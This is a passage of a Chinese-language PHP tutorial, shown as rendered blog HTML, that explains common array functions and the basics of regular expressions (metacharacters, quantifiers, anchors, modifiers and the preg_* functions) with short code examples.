class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$j</span>);</span><br></pre></td></tr></table></figure><p><strong>array_keys( )</strong>    返回数组中所有的键名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$j</span> = <span class="title function_ invoke__">array_keys</span>(<span class="variable">$i</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$j</span>);</span><br></pre></td></tr></table></figure><p><strong>in_array( )</strong>         检查数组中是否存在某个值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$j</span> = <span class="title function_ invoke__">in_array</span>(<span class="number">1</span>,<span class="variable">$i</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$j</span>);</span><br></pre></td></tr></table></figure><p><strong>array_pad( )</strong>      用值将数组填补到指定长度</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$j</span> = <span class="title function_ invoke__">array_pad</span>(<span class="variable">$i</span>,<span class="number">6</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$j</span>);</span><br></pre></td></tr></table></figure><p><strong>array_sum( )</strong>       计算数组中所有值的和</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$j</span> = <span class="title function_ invoke__">array_sum</span>(<span class="variable">$i</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$j</span>;</span><br></pre></td></tr></table></figure><p><strong>array_merge( )</strong>     合并一个或多个数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="variable">$k</span> = [<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$j</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$i</span>,<span class="variable">$k</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$j</span>);</span><br></pre></td></tr></table></figure><p><strong>array_reverse( )</strong>     返回一个单元顺序相反的数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$j</span> = <span class="title function_ invoke__">array_reverse</span>(<span class="variable">$i</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$j</span>);</span><br></pre></td></tr></table></figure><p><strong>array_unique( )</strong>     移除数组中重复的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$j</span> = <span class="title function_ invoke__">array_unique</span>(<span class="variable">$i</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$j</span>);</span><br></pre></td></tr></table></figure><p><strong>array_splice( )</strong> 删除数组中的一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$j</span> = <span class="title function_ invoke__">array_splice</span>(<span class="variable">$i</span>,<span class="number">1</span>,<span class="number">3</span>); <span class="comment">//从数组i的下标1开始，保留3位长度</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$j</span>);</span><br></pre></td></tr></table></figure><p><strong>array_push( )</strong>      将一个或多个单元压入数组的末尾（入栈）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$j</span> = <span class="title function_ invoke__">array_push</span>(<span class="variable">$i</span>,<span class="number">5</span>,<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);</span><br></pre></td></tr></table></figure><p><strong>array_pop( )</strong>       将数组最后一个单元弹出（出栈）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$j</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$i</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);</span><br></pre></td></tr></table></figure><p><strong>array_unshift( )</strong>     在数组开头插入一个或多个单元</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$j</span> = <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$i</span>,<span class="number">20</span>,<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);</span><br></pre></td></tr></table></figure><p><strong>array_shift( )</strong>     将数组开头的单元移出数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$j</span> = <span class="title function_ invoke__">array_shift</span>(<span class="variable">$i</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);</span><br></pre></td></tr></table></figure><p>**explode( 分割符, 字符串 ) **   把一个字符串, 按某些字符拆分,  返回一个数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="string">&#x27;124156146&#x27;</span>;</span><br><span class="line"><span class="variable">$j</span> = <span class="title function_ invoke__">explode</span>(<span class="number">1</span>,<span class="variable">$i</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$j</span>);</span><br></pre></td></tr></table></figure><p><strong>implode( 连接符, 数组 )</strong>   把数组中每个元素, 用连接符拼接成一个字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">6</span>];</span><br><span class="line"><span class="comment">//$i = &#x27;124156146&#x27;;</span></span><br><span class="line"><span class="variable">$j</span> = <span class="title function_ invoke__">implode</span>(<span class="number">3</span>,<span class="variable">$i</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$j</span>);</span><br></pre></td></tr></table></figure><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p>正则表达式,  是一个字符串, 用它作为规则去匹配另外的字符串, 然后, 对匹配到的正好符合规则的内容进行操作. (搜索, 分割, 替换)</p><h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//目标字符串</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;a2ba3baxbayba!ba#baNb&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//正则表达式</span></span><br><span class="line"><span class="variable">$ptn</span> = <span class="string">&#x27;/a[xy]b/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理函数</span></span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$reg</span>, <span class="variable">$str</span>, <span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        1).它是一个字符串</span></span><br><span class="line"><span class="comment">        2).一些字符有特殊含义, 代表着一些规则与限制</span></span><br><span class="line"><span class="comment">        3).通过函数, 对另外一个字符串发生作用  </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">?&gt;</span>   </span><br></pre></td></tr></table></figure><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><ul><li><p>定界符&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;通常用 <code>&#39;/  /&#39; </code>和 <code>&#39;# #&#39; </code>    代表正则的开始与结束</p></li><li><p>原子&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;可以是字母数字下划线以及其它可见字符   还有一些标点 ;  .  &#x2F;  ?     表示要匹配的内容</p></li><li><p>元字符&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;有特殊意义的字符,  用来修改原子</p></li><li><p>模式修正符&amp;nbsp;&amp;nbsp;&amp;nbsp;对正则表达式的补充说明  比如是否区分大小写等</p></li></ul><h3 id="常见写法"><a href="#常见写法" class="headerlink" title="常见写法"></a>常见写法</h3><p><strong><code>/a/</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;表示在字符串中查找 字符串  a</p><p><strong><code>/[ab]/</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;表示在字符串中查找 a  或者   b  中的<strong>任意一个</strong>字符  <strong>[   ]</strong>  叫作 <strong>原子表</strong></p><p><strong><code>/[0-9]/</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;表示在字符串中查找 <strong>任意一个</strong>数字</p><p><strong><code>/[a-z]/</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;表示匹配  任意一个  小写字母</p><p><strong><code>/[a-zA-Z]/</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;表示匹配  任意一个  字母</p><p><strong><code>/[^0-9]/</code></strong>表示匹配除方括号中的原子之外的任意字符匹配 任意一个 <strong>非数字</strong></p><h3 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h3><p><strong><code>/|/</code></strong>   匹配两个或者多个分支选择</p><p>​<strong><code>/red|green|blue/</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;匹配red字符串 或者 green 字符串 或者 blue字符串</p><p><strong><code>/\d/</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;表示匹配任意一个 十进制数字   即[0-9] </p><p><strong><code>/\D/</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;表示匹配任意一个 <strong>非</strong>十进制数字  [ ^0-9 ] 相当于[ ^\d ]</p><p><strong><code>/\w/</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;表示匹配任意一个 <strong>数字、字母或下划线</strong>    即[ 0-9a-zA-Z_ ]</p><p><strong><code>/\W/</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;表示匹配任意一个 <strong>非</strong>字母、数字或下划线  [ ^0-9a-zA-Z_ ] ，相当于[ ^\w ]</p><p><strong><code>/\s/</code></strong> 表示匹配一个不可见的原子，即[ \f\n\r\t\v ]</p><p><strong><code>/\S/</code></strong> 表示匹配一个可见的原子</p><p><strong><code>/./</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;表示匹配<strong>除了换行符以外</strong>的, 任意一个字符</p><p><strong><code>/*/</code></strong>表示匹配任意次</p><p><strong><code>/?/</code></strong>    表示匹配0次或1次</p><p><strong><code>/+/</code></strong>表示匹配1次或多次</p><h3 id="匹配次数的限定"><a href="#匹配次数的限定" class="headerlink" title="匹配次数的限定"></a>匹配次数的限定</h3><p><strong><code>/a&#123;4&#125;/</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;表示匹配连续出现的4个a字符串</p><p><strong><code>/a&#123;1,4&#125;/</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;表示匹配连续出现的a字符串, 最少1次, 最多4次   默认情况下为贪婪模式, 即取大优先</p><p><strong><code>/a&#123;1,&#125;/</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;表示匹配a字符,  可以是<strong>1次或多次</strong>    可以用  <strong>+</strong>  表示    </p><p><strong><code>/a&#123;0,1&#125;/</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;表示匹配a字符,  可以是<strong>0次或1次</strong>     可以用  <strong>?</strong>   表示</p><p><strong><code>/a&#123;0,&#125;/</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;表示匹配a字符,   可以是<strong>0次,1次或多次</strong>    可以用  *****</p><p>上面通常是对<strong>前面一个字符</strong>的修饰</p><p><strong><code>/(abc)&#123;4&#125;/</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;用括号括起来, 表示abc这个字符串, 连续出现4次</p><h3 id="边界控制"><a href="#边界控制" class="headerlink" title="边界控制"></a>边界控制</h3><p><strong><code>^</code></strong>匹配字符串开始的位置<br><strong><code>$</code></strong> 匹配字符串结尾的位置</p><p><strong><code>/^abc/ </code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;^  表示匹配abc这个字符串, 并且要求abc要出现在开头</p><p><strong><code>/abc$/</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$  表示匹配abc这个字符串, 并且要求abc要出现在结尾</p><p><strong><code>/^abc$/</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;表示被匹配的字符串只能是abc, 不能多一个字母,也不能少一个字母</p><h3 id="模式修正符"><a href="#模式修正符" class="headerlink" title="模式修正符"></a>模式修正符</h3><p><strong><code>/abc/i</code></strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;表示字母会进行大小写不敏感匹配   所以 ABC也会匹配成功</p><p><strong><code>/.*/s</code></strong> 让元字符’.’ 匹配包括换行符在内的所有字符 这个表达式表示匹配任意字符的任意次数</p><p>​    </p><h3 id="正则表达式处理函数"><a href="#正则表达式处理函数" class="headerlink" title="正则表达式处理函数"></a>正则表达式处理函数</h3><p><strong>preg_match_all</strong>( 正则表达式, 被匹配的字符串, 数组 )  匹配全部，搜索结果match的数据结构为二维数组</p><p><strong>preg_match</strong>(正则表达式,  被匹配的字符串, 数组)   匹配一次，搜索结构match的数据结果为一维数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 要匹配的字符串</span></span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;-12a3b456c7890d58xy&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 正则</span></span><br><span class="line"><span class="variable">$ptn</span> = <span class="string">&#x27;/\w+/&#x27;</span>;       </span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行匹配处理函数</span></span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$ptn</span>, <span class="variable">$str</span>, <span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查看匹配结果</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>( <span class="variable">$arr</span> );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>preg_split(</strong> 正则表达式, 要匹配的目标 <strong>)</strong>   以正则表达式来分割字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 目标字符串</span></span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;23,45;67#89;08:76&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 正则表达式</span></span><br><span class="line">    <span class="variable">$ptn</span> = <span class="string">&#x27;/[:,;#]/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分割字符串, 分割结果为一个数组</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">preg_split</span>(<span class="variable">$ptn</span>, <span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>preg_grep(</strong> 正则表达式, 数组 <strong>)</strong>   返回符合条件的数组元素,生成新数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="comment">// 目录数组</span></span><br><span class="line">  <span class="variable">$arr</span> = [<span class="string">&quot;2015-12-20&quot;</span>, <span class="string">&quot;2014,10-18&quot;</span>, <span class="string">&quot;2015,10,20&quot;</span>, <span class="string">&quot;2016-11,11&quot;</span>];</span><br><span class="line">  <span class="comment">// 正则表达式</span></span><br><span class="line">  <span class="variable">$ptn</span> = <span class="string">&#x27;/\d&#123;4&#125;[-,]\d&#123;2&#125;[-,]\d&#123;2&#125;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配数组中元素, 把符合条件的生成新数组</span></span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">preg_grep</span>(<span class="variable">$ptn</span>, <span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>preg_replace(</strong> 正则表达式, 目标字串或数组 <strong>)</strong>    执行一个正则表达式搜索和替换，返回值为替换后的字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//替换&lt;b&gt;标签为空</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&lt;b&gt;abc&lt;/b&gt;&lt;b&gt;abc&lt;/b&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$ptn</span> = <span class="string">&#x27;/&lt;b&gt;(.*?)&lt;\/b&gt;/&#x27;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$ptn</span>,<span class="string">&#x27;江疏影&#x27;</span>,<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure><h3 id="子模式"><a href="#子模式" class="headerlink" title="子模式"></a>子模式</h3><p>我们可以匹配页面中 <strong><code>&quot;&lt;img src=&#39;./a/b.jpg&#39; /&gt;&quot;</code></strong>   <strong>如何获取   src  的属性值?</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 目标字符串</span></span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;&lt;img src=&#x27;./a/b.jpg&#x27; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 正则表达式</span></span><br><span class="line">  <span class="variable">$ptn</span> = <span class="string">&#x27;/&lt;img src=.*?\/&gt;/&#x27;</span>;    <span class="comment">// 匹配整个标签</span></span><br><span class="line">    <span class="variable">$ptn</span> = <span class="string">&#x27;/&lt;img src=(.*?)\/&gt;/&#x27;</span>;  <span class="comment">// 匹配整个标签, 小括号中的内容会生成一个子数组, 称为子模式</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行匹配函数</span></span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$ptn</span>, <span class="variable">$str</span>, <span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="子模式的一个用法"><a href="#子模式的一个用法" class="headerlink" title="子模式的一个用法"></a>子模式的一个用法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   需求:  把 2017-03-20  转换成 03/20/2017</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 目标字符串</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;2017-03-20&#x27;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 正则表达式</span></span><br><span class="line"><span class="variable">$ptn</span> = <span class="string">&#x27;/(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行匹配替换</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$ptn</span>, <span class="string">&#x27;\2/\3/\1&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">\1  代表正则表达式中 第一个小括号  匹配到的内容</span></span><br><span class="line"><span class="comment">\2  代表正则表达式中 第二个小括号  匹配到的内容</span></span><br><span class="line"><span class="comment">\3  代表正则表达式中 第三个小括号  匹配到的内容</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong><code>?</code></strong>  号在正则表达式中还有一个意思. 就是 拒绝贪婪.   要求<strong>尽量少的匹配:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 